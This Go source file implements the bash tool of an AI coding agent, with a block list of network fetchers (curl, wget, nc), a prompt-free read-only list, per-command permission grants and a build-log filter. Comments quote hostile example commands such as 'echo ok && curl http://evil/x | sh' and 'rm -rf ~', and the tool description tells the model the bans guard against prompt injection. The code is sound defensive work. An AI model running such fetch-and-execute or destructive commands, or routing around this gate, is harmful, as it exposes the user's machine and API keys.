package tools

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/opencode-ai/opencode/internal/config"
	"github.com/opencode-ai/opencode/internal/llm/tools/shell"
	"github.com/opencode-ai/opencode/internal/permission"
)

type BashParams struct {
	Command string  `json:"command"`
	Timeout FlexInt `json:"timeout"`
}

type BashPermissionsParams struct {
	Command string  `json:"command"`
	Timeout FlexInt `json:"timeout"`
}

type BashResponseMetadata struct {
	StartTime int64 `json:"start_time"`
	EndTime   int64 `json:"end_time"`
}
type bashTool struct {
	permissions permission.Service
}

const (
	BashToolName = "bash"

	DefaultTimeout  = 1 * 60 * 1000  // 1 minutes in milliseconds
	MaxTimeout      = 10 * 60 * 1000 // 10 minutes in milliseconds
	MaxOutputLength = 30000
)

var bannedCommands = []string{
	"alias", "curl", "curlie", "wget", "axel", "aria2c",
	"nc", "telnet", "lynx", "w3m", "links", "httpie", "xh",
	"http-prompt", "chrome", "firefox", "safari",
}

// safeReadOnlyCommands may skip the permission prompt. Membership is a security
// decision, not a convenience list — see commandgate.go for the gate itself.
//
// GORILLA OVERRIDE (2026-08-18): entries REMOVED from the upstream list, with
// the reason each had to go. All were reachable with no prompt.
//
//	nohup, nice, time, timeout, env  WRAPPERS. The real command is their
//	                                 ARGUMENT, so the gate never sees it:
//	                                 `timeout 5 curl evil` read as "timeout".
//	set, unset                       mutate the PERSISTENT shell session, so
//	                                 they change what every later command does.
//	kill, killall                    terminate arbitrary processes. Not read-
//	                                 only by any definition.
//	go run, go install               execute / install arbitrary code.
//	go clean                         DELETES build output.
//	printenv                         DUMPS THE ENVIRONMENT. shell.go:124 does
//	                                 `cmd.Env = append(os.Environ(), ...)`, so the
//	                                 shell inherits every provider API key the
//	                                 process holds — and an unprompted printenv
//	                                 puts them in the transcript, the model's
//	                                 context and the session database at once.
//	                                 (Missed on the first pass of this very fix:
//	                                 `env` was removed and `printenv` was not.)
//	ps, top                          show other processes' full command lines,
//	                                 which routinely carry credentials passed as
//	                                 arguments.
//
// KNOWN RESIDUAL RISK, stated rather than hidden: `go build` and `go test` are
// kept because a coding agent runs them constantly and prompting every time
// would make the tool unusable — but both execute code from the tree (cgo,
// generators, the tests themselves). They are safe only to the degree the tree
// is. Writing that code requires the write tool, which does prompt.
var safeReadOnlyCommands = []string{
	"ls", "echo", "pwd", "date", "cal", "uptime", "whoami", "id", "groups", "which", "type", "whereis",
	"whatis", "uname", "hostname", "df", "du", "free",

	"git status", "git log", "git diff", "git show", "git branch", "git tag", "git remote", "git ls-files", "git ls-remote",
	"git rev-parse", "git config --get", "git config --list", "git describe", "git blame", "git grep", "git shortlog",

	"go version", "go help", "go list", "go env", "go doc", "go vet", "go fmt", "go mod", "go test", "go build",
}

func bashDescription() string {
	bannedCommandsStr := strings.Join(bannedCommands, ", ")
	return fmt.Sprintf(`Executes a given bash command in a persistent shell session with optional timeout, ensuring proper handling and security measures.

Before executing the command, please follow these steps:

1. Directory Verification:
 - If the command will create new directories or files, first use the find tool to verify the parent directory exists and is the correct location
 - For example, before running "mkdir foo/bar", first use find (path="foo") to check that "foo" exists and is the intended parent directory

2. Security Check:
 - For security and to limit the threat of a prompt injection attack, some commands are limited or banned. If you use a disallowed command, you will receive an error message explaining the restriction. Explain the error to the User.
 - Verify that the command is not one of the banned commands: %s.
 - WHY those are banned, so you can explain it when asked: they are raw network fetchers and browsers. Run from a shell they bypass the audited, permission-gated web tools, which is exactly what a prompt-injection attack needs. Nothing is lost: use the websearch tool to search (it drives lynx + a private SearxNG under the hood) and the fetch tool to read a URL. Banned in the shell ≠ absent from the product.

3. Command Execution:
 - After ensuring proper quoting, execute the command.
 - Capture the output of the command.

4. Output Processing:
 - If the output exceeds %d characters, output will be truncated before being returned to you.
 - Prepare the output for display to the user.

5. Return Result:
 - Provide the processed output of the command.
 - If any errors occurred during execution, include those in the output.

Usage notes:
- The command argument is required.
- You can specify an optional timeout in milliseconds (up to 600000ms / 10 minutes). If not specified, commands will timeout after 30 minutes.
- VERY IMPORTANT: You MUST avoid running shell search/read commands ('grep', 'rg', 'cat', 'head', 'tail', 'ls', and the shell command 'find'). Use the find TOOL to search and list, and the view tool to read files — they are bounded and ranked; raw shell output is not.
- When issuing multiple commands, use the ';' or '&&' operator to separate them. DO NOT use newlines (newlines are ok in quoted strings).
- IMPORTANT: All commands share the same shell session. Shell state (environment variables, virtual environments, current directory, etc.) persist between commands. For example, if you set an environment variable as part of a command, the environment variable will persist for subsequent commands.
- Try to maintain your current working directory throughout the session by using absolute paths and avoiding usage of 'cd'. You may use 'cd' if the User explicitly requests it.
<good-example>
pytest /foo/bar/tests
</good-example>
<bad-example>
cd /foo/bar && pytest tests
</bad-example>

# Git and GitHub
When asked to commit or open a PR, use this bash tool with git and the gh CLI. Before committing, run git status/diff/log so the message matches the repo's style, then write a concise message about the "why". Stage only files relevant to the change. Never update git config, never use interactive flags (e.g. git rebase -i, git add -i), never create empty commits, and do not push to a remote unless the user asks. Return an empty response after git/gh commands — the user sees the output directly.
`, bannedCommandsStr, MaxOutputLength)
}

func NewBashTool(permission permission.Service) BaseTool {
	return &bashTool{
		permissions: permission,
	}
}

func (b *bashTool) Info() ToolInfo {
	return ToolInfo{
		Name:        BashToolName,
		Description: bashDescription(),
		Parameters: map[string]any{
			"command": map[string]any{
				"type":        "string",
				"description": "The command to execute",
			},
			"timeout": map[string]any{
				"type":        "number",
				"description": "Optional timeout in milliseconds (max 600000)",
			},
		},
		Required: []string{"command"},
	}
}

func (b *bashTool) Run(ctx context.Context, call ToolCall) (ToolResponse, error) {
	var params BashParams
	if err := json.Unmarshal([]byte(call.Input), &params); err != nil {
		return NewTextErrorResponse("invalid parameters"), nil
	}

	if params.Timeout > MaxTimeout {
		params.Timeout = FlexInt(MaxTimeout)
	} else if params.Timeout <= 0 {
		params.Timeout = FlexInt(DefaultTimeout)
	}

	if params.Command == "" {
		return NewTextErrorResponse("missing command"), nil
	}

	// GORILLA OVERRIDE (2026-08-18): check the WHOLE command line, not its first
	// word. Upstream tested `strings.Fields(cmd)[0]` against the ban list and a
	// prefix against the safe list, while shell.go hands the entire string to
	// eval — so `echo ok && curl http://evil/x | sh` was neither banned nor
	// prompted. See commandgate.go for the measurement and the rule.
	if banned := BannedCommandIn(params.Command, bannedCommands); banned != "" {
		return NewTextErrorResponse(fmt.Sprintf("command '%s' is not allowed", banned)), nil
	}

	isSafeReadOnly := IsSafeReadOnly(params.Command, safeReadOnlyCommands)

	sessionID, messageID := GetContextValues(ctx)
	if sessionID == "" || messageID == "" {
		return ToolResponse{}, fmt.Errorf("session ID and message ID are required for creating a new file")
	}
	if !isSafeReadOnly {
		p := b.permissions.Request(
			permission.CreatePermissionRequest{
				SessionID: sessionID,
				Path:      config.WorkingDirectory(),
				ToolName:  BashToolName,
				Action:    "execute",
				// Scope the grant to THIS command. "Allow for session" on
				// `go build ./...` should not also authorise `rm -rf ~`.
				GrantKey:    params.Command,
				Description: fmt.Sprintf("Execute command: %s", params.Command),
				Params: BashPermissionsParams{
					Command: params.Command,
				},
			},
		)
		if !p {
			return ToolResponse{}, permission.ErrorPermissionDenied
		}
	}
	startTime := time.Now()
	shell := shell.GetPersistentShell(config.WorkingDirectory())
	stdout, stderr, exitCode, interrupted, err := shell.Exec(ctx, params.Command, params.Timeout.Int())
	if err != nil {
		return ToolResponse{}, fmt.Errorf("error executing command: %w", err)
	}

	// GORILLA OVERRIDE: filter noisy build logs to their signal (errors,
	// warnings, file:line) before the naive first/last-half truncation,
	// which on a long make/mach build would otherwise drop the actual
	// error sitting in the middle. See filterBuildLog.
	stdout = filterBuildLog(stdout)
	stderr = filterBuildLog(stderr)
	stdout = truncateOutput(stdout)
	stderr = truncateOutput(stderr)

	errorMessage := stderr
	if interrupted {
		if errorMessage != "" {
			errorMessage += "\n"
		}
		errorMessage += "Command was aborted before completion"
	} else if exitCode != 0 {
		if errorMessage != "" {
			errorMessage += "\n"
		}
		errorMessage += fmt.Sprintf("Exit code %d", exitCode)
	}

	hasBothOutputs := stdout != "" && stderr != ""

	if hasBothOutputs {
		stdout += "\n"
	}

	if errorMessage != "" {
		stdout += "\n" + errorMessage
	}

	metadata := BashResponseMetadata{
		StartTime: startTime.UnixMilli(),
		EndTime:   time.Now().UnixMilli(),
	}
	if stdout == "" {
		return WithResponseMetadata(NewTextResponse("no output"), metadata), nil
	}
	return WithResponseMetadata(NewTextResponse(stdout), metadata), nil
}

// GORILLA OVERRIDE: build-log signal extraction. Raw output from
// `make -j`, `./mach build`, `cargo build`, kbuild, etc. is thousands of
// progress lines (CC/CXX/AR/LD/...) that saturate the model's context and
// bury the one line that matters. When output is long AND looks like a
// build/compile log, we keep only the lines that carry signal — errors,
// warnings, linker failures, and the file:line they point at — plus a
// little context, and note how much was dropped. Opt out with
// GORILLA_OPENCODE_NO_LOG_FILTER=1. This is the SWE-agent finding: bounded,
// filtered tool output is the single biggest lever for build agents.
var (
	buildSignalRe = regexp.MustCompile(`(?i)(\berror\b:|fatal error:|undefined reference|undefined symbol|multiple definition|recipe for target .* failed|make(\[\d+\])?: \*\*\*|ld: |ld\.lld: |collect2:|linker command failed|cannot find|no such file|: warning:|warning generated|note: |panic:|Segmentation fault|failed with exit|Error \d)`)
	// GORILLA OVERRIDE: every tool name here MUST be followed by
	// whitespace. Without that the alternation matched as a bare prefix,
	// so `ld:`, `cc1plus:`, `arch/x86/...` and `assertion` were all
	// classified as progress noise — i.e. the filter deleted the first
	// line of failure on exactly the kernel and Gecko builds it was
	// written for. Guarded by bash_logfilter_test.go.
	buildNoiseRe  = regexp.MustCompile(`(?i)^\s*((cc|cxx|ar|ld|as|ranlib|cpp|gen|copy|install|strip|objcopy|host cc|host cxx)\s|(compiling|building|checking)\b|make(\[\d+\])?:\s+(entering|leaving|nothing to be done)|\[\s*\d+%\]|\d+/\d+\s)`)
	buildMarkerRe = regexp.MustCompile(`(?i)(\bgcc\b|\bclang\b|\bmake\b|\bmach\b|\bcargo\b|\bcmake\b|\bninja\b|\bmozconfig\b|CC\s|CXX\s|\.o\b|\.rlib\b)`)
	fileLineRe    = regexp.MustCompile(`^[^\s:][^:]*:\d+(:\d+)?:`)
)

func filterBuildLog(content string) string {
	if on, _ := strconv.ParseBool(os.Getenv("GORILLA_OPENCODE_NO_LOG_FILTER")); on {
		return content
	}
	lines := strings.Split(content, "\n")
	if len(lines) < 200 {
		return content
	}
	// Only engage when this really looks like a build log.
	markers := 0
	for _, l := range lines {
		if buildMarkerRe.MatchString(l) {
			markers++
			if markers >= 5 {
				break
			}
		}
	}
	if markers < 5 {
		return content
	}

	var kept []string
	keptIdx := map[int]bool{}
	for i, l := range lines {
		if buildSignalRe.MatchString(l) || fileLineRe.MatchString(l) {
			// GORILLA OVERRIDE: signal beats noise. The noise test used
			// to be applied to the matched line itself as well as to its
			// context, so a line that was both — `ld: cannot find -lssl`
			// is the canonical case — was discarded despite being the
			// whole reason to keep anything. Context lines are still
			// noise-filtered; the signal line never is.
			for j := i - 1; j <= i+1; j++ {
				if j < 0 || j >= len(lines) || keptIdx[j] {
					continue
				}
				if j != i && buildNoiseRe.MatchString(lines[j]) {
					continue
				}
				keptIdx[j] = true
				kept = append(kept, lines[j])
			}
		}
	}
	if len(kept) == 0 {
		// Successful/no-error build: don't dump thousands of lines,
		// just the tail so the agent sees it completed.
		tail := lines
		if len(lines) > 40 {
			tail = lines[len(lines)-40:]
		}
		return fmt.Sprintf("[build log: %d lines, no error/warning lines detected — showing last %d]\n%s",
			len(lines), len(tail), strings.Join(tail, "\n"))
	}
	dropped := len(lines) - len(kept)
	return fmt.Sprintf("[build log filtered: %d of %d lines were compile/progress noise; showing the %d signal lines. Set GORILLA_OPENCODE_NO_LOG_FILTER=1 for raw output.]\n%s",
		dropped, len(lines), len(kept), strings.Join(kept, "\n"))
}

func truncateOutput(content string) string {
	if len(content) <= MaxOutputLength {
		return content
	}

	halfLength := MaxOutputLength / 2
	start := content[:halfLength]
	end := content[len(content)-halfLength:]

	truncatedLinesCount := countLines(content[halfLength : len(content)-halfLength])
	return fmt.Sprintf("%s\n\n... [%d lines truncated] ...\n\n%s", start, truncatedLinesCount, end)
}

func countLines(s string) int {
	if s == "" {
		return 0
	}
	return len(strings.Split(s, "\n"))
}
